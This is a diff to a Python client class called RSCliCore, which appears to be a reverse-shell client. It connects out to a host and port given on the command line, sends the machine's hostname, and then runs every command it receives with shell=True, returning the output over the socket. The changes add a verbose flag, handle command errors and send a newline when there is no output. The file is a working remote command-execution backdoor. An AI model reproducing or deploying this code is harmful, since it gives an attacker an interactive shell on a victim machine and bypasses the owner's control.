@@ -25,7 +25,7 @@
 from argparse import ArgumentParser
 import socket
 from sys import exit
-from subprocess import check_output, STDOUT
+from subprocess import check_output, STDOUT, CalledProcessError
 from time import sleep
 
 
@@ -46,9 +46,9 @@ class RSCliCore:
 
         self.arg_parser.add_argument('--version', action = 'version',
                 version = '%(prog)s ' + str(__version__))
-        self.arg_parser.add_argument('-p',
-                action = 'store_true', dest = 'printcmd',
-                help = ('print received commands'))
+        self.arg_parser.add_argument('--verbose',
+                action = 'store_true', dest = 'verbose',
+                help = ('enable terminal output'))
         self.arg_parser.add_argument('host',
                 action = 'store',
                 help = ('set the remote host'))
@@ -68,20 +68,27 @@ class RSCliCore:
                 print('Error: Connection refused for host '+ self.args.host + \
                         ' port ' + str(self.args.port) + '.')
                 exit(1)
+            s.send(bytes(socket.gethostname(), 'utf8'))
         
             while True:
                 cmd = str(s.recv(1024))[2:-1]
                 if cmd:
-                    if self.args.printcmd:
+                    if self.args.verbose:
                         print(cmd)
                     if cmd == 'exit':
                         s.close()
                         exit(0)
                     else:
-                        procoutput = check_output(cmd, shell = True,
-                                stderr=STDOUT)
+                        try:
+                            procoutput = check_output(cmd, shell = True,
+                                    stderr=STDOUT)
+                        except CalledProcessError:
+                            procoutput = bytes('Error: ' + cmd + \
+                                    ' returned non-zero exit code.\n', 'utf8')
                         if procoutput:
                             s.send(procoutput)
+                        else:
+                            s.send(bytes('\n', 'utf8'))
                 else:
                     sleep(0.1)
 
